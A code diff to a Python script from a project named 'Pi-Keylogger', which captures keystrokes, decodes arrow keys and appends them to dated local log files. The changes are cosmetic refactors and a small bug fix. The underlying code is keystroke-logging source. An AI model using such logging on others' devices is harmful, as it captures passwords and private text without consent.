@@ -4,7 +4,7 @@ import time
 import serial
 
 def handler(signum, frame):
-    log(chr(26))
+    log(chr(26), date)
 
 def log(char, date):
     print("This is the char code " + str(ord(char)))
@@ -25,18 +25,18 @@ def log(char, date):
     elif ord(char) == 215:
         char = " RightArrow "
 
-    with open("/home/rikka/Pi-Keylogger/log/" + date + ".txt", "a+") as f:
+    with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "a+") as f:
         f.write(char)
 
 def arrow(char):
     if ord(char) == 65:
-        return 218
+        return 218  # Up Arrow
     elif ord(char) == 67:
-        return 215
+        return 215  # Right Arrow
     elif ord(char) == 68:
-        return 216
+        return 216  # Left Arrow
     elif ord(char) == 66:
-        return 217
+        return 217  # Down Arrow
     else:
         return 0
 
@@ -45,8 +45,8 @@ date = time.strftime("%c").replace(" ", "-")
 
 print(date)
 
-with open("/home/rikka/Pi-Keylogger/log/" + date + ".txt", "w+") as f:
-    f.write("Started at " + date + "\n")
+with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "w+") as f:
+    f.write(f"Started at {date}\n")
 
 signal.signal(signal.SIGTSTP, handler)
 
@@ -54,9 +54,9 @@ while True:
     try:
         try:
             char = getch.getch()
-            if ord(char) == 27:
+            if ord(char) == 27:  # Escape sequence (arrow keys, etc.)
                 _char = getch.getch()
-                if ord(_char) == 91:
+                if ord(_char) == 91:  # Arrow key indicator
                     char = chr(arrow(getch.getch()))
                     log(char, date)
                 else:
